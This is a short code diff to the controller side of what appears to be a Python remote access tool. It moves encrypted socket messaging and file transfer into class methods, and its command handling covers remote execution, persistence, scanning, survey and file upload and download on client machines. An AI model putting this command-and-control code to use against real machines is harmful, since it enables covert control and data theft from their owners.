@@ -16,7 +16,6 @@ import time
 
 from core import common
 from core import crypto
-from core import filesock
 
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
@@ -104,9 +103,10 @@ class ClientConnection(common.Client):
             return
 
         # send prompt to client
-        crypto.sendGCM(self.conn, self.GCM, self.IV, prompt)
+        self.sendGCM(prompt)
         self.conn.settimeout(1)
-        self.IV += 1
+
+        #cmd, _, action = prompt.partition(" ")
 
         # kill client connection
         if cmd == 'kill':
@@ -120,7 +120,7 @@ class ClientConnection(common.Client):
                     print 'Error: File name already exists.'
                     return
 
-                filesock.recvfile(self.conn, self.GCM, fname)
+                self.recvfile(fname)
 
         # send file
         elif cmd == 'upload':
@@ -130,16 +130,16 @@ class ClientConnection(common.Client):
                     print 'Error: File not found.'
                     return
 
-                filesock.sendfile(self.conn, self.GCM, self.IV, fname)
+                self.sendfile(fname)
 
         # regenerate DH key
         elif cmd == 'rekey':
-            self.dh_key = crypto.diffiehellman(self.conn, server=True)
+            self.dh_key = crypto.diffiehellman(self.conn)
 
         # results of execute, persistence, scan, survey, unzip, or wget
         elif cmd in ['execute', 'persistence', 'scan', 'survey', 'unzip', 'wget']:
             print 'Running {}...'.format(cmd)
-            recv_data = crypto.recvGCM(self.conn, self.GCM).rstrip()
+            recv_data = self.recvGCM().rstrip()
             print recv_data
 
 
@@ -223,7 +223,8 @@ def main():
         # send data to client
         try:
             client.send(prompt, cmd, action)
-        except (socket.error, ValueError):
+        except (socket.error, ValueError) as e:
+            print e
             print 'Client {} disconnected.'.format(curr_client_id)
             cmd = 'kill'
 
